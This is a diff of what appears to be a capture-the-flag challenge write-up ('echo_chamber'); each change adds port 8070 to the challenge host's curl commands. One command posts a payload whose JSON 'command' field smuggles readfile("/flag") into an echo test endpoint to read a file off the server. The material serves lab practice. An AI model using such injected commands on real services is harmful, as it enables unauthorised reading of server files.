@@ -60,7 +60,7 @@ This is much simpler than the TCP self-connect vulnerability!
 
 Try accessing the echo test mode:
 ```bash
-curl "http://ctf.dscjssstuniv.in/?test=echo" -X POST -d "Hello World"
+curl "http://ctf.dscjssstuniv.in:8070/?test=echo" -X POST -d "Hello World"
 ```
 
 You should see:
@@ -84,7 +84,7 @@ Create the payload:
 
 Send the malicious payload to the echo test mode:
 ```bash
-curl "http://ctf.dscjssstuniv.in/?test=echo" \
+curl "http://ctf.dscjssstuniv.in:8070/?test=echo" \
      -X POST \
      -H "Content-Type: application/json" \
      -d '{"signal":"Echo","command":"readfile(\"/flag\");"}'
@@ -137,7 +137,7 @@ echo_chamber/
 docker-compose up -d
 
 # Access the application
-curl "http://ctf.dscjssstuniv.in/?probe=50000" -X POST -d '{"signal":"test"}'
+curl "http://ctf.dscjssstuniv.in:8070/?probe=50000" -X POST -d '{"signal":"test"}'
 
 # Clean up
 docker-compose down
